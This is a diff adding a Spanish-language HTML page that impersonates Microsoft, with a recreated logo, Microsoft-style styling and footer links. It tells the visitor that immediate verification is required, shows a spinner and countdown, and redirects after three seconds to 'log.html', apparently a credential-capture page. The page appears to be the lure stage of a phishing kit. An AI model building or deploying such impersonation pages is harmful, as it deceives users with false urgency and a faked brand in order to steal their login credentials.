@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * {
+            margin: 0px;
+            padding: 0px;
+            box-sizing: border-box;
+            list-style: none;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+
+        #l-c {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('fondo1.jpg') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        #l-b {
+            width: 440px;
+            height: auto;
+            padding: 44px;
+            background-color: white;
+            box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e1e1e1;
+            border-top: 3px solid #0067b8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 3px;
+            background: #e1e1e1;
+            margin-top: 25px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: #0067b8;
+            width: 0%;
+        }
+
+        #counter-text {
+            font-size: 12px;
+            color: #505050;
+            margin-top: 15px;
+        }
+
+        @media (max-width: 600px) {
+            #l-c {
+                background: white !important;
+            }
+
+            #l-b {
+                box-shadow: none !important;
+                width: 100% !important;
+                padding: 20px !important;
+            }
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <section id="l-c">
+        <div id="l-b">
+            <div class="logo-container mb-8">
+                <div class="flex items-center justify-center">
+                    <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
+                        <div class="bg-[#f25022]"></div>
+                        <div class="bg-[#7fba00]"></div>
+                        <div class="bg-[#00bcf2]"></div>
+                        <div class="bg-[#ffb900]"></div>
+                    </div>
+                    <span class="text-[21px] font-semibold text-[#1b1b1b] font-sans">Microsoft</span>
+                </div>
+            </div>
+
+            <h2><strong>BIENVENIDO</strong></h2>
+            <div class="spinner"></div>
+            <p>El sistema requiere tu verificación de forma inmediata</p>
+
+            <div class="progress-bar-container">
+                <div id="barra" class="progress-bar-fill"></div>
+            </div>
+
+            <div id="counter-text">Redirigiendo en <span id="segundos"></span> segundos</div>
+        </div>
+    </section>
+
+    <div class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-gray-200 py-2 z-50">
+        <div class="max-w-4xl mx-auto px-4">
+            <div
+                class="flex flex-col sm:flex-row items-center justify-center space-y-0.5 sm:space-y-0 sm:space-x-6 text-xs text-gray-500">
+                <a href="#" class="hover:text-blue-600 transition-colors">Ayuda</a>
+                <a href="#" class="hover:text-blue-600 transition-colors">Términos de uso</a>
+                <a href="#" class="hover:text-blue-600 transition-colors">Privacidad y cookies</a>
+                <span class="text-center text-xs px-1 leading-tight hidden sm:inline">Usa la exploración privada si este
+                    no es tu dispositivo. <a href="#" class="text-blue-600 hover:underline">Más información</a></span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TIEMPO_TOTAL = 3;
+
+        const spanSegundos = document.getElementById('segundos');
+        const barra = document.getElementById('barra');
+
+        let cuenta = TIEMPO_TOTAL;
+        spanSegundos.innerText = cuenta;
+
+        barra.style.transition = `width ${TIEMPO_TOTAL}s linear`;
+
+        setTimeout(() => {
+            barra.style.width = "100%";
+        }, 100);
+
+        const interval = setInterval(() => {
+            cuenta--;
+            spanSegundos.innerText = cuenta;
+            if (cuenta <= 0) clearInterval(interval);
+        }, 1000);
+
+        setTimeout(function () {
+            window.location.href = "log.html";
+        }, TIEMPO_TOTAL * 1000);
+    </script>
+</body>
+
+</html>
